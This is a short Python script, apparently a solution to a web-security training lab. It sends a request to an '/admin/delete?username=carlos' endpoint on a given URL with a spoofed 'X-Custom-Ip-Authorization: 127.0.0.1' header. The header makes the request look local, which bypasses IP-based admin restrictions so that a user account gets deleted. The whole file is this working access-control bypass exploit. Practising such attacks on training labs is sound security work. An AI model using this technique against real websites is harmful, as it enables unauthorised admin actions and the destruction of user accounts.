import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/admin/delete?username=carlos'

burp_headers = {"X-Custom-Ip-Authorization": "127.0.0.1"}
requests.get(burp_url, headers=burp_headers)
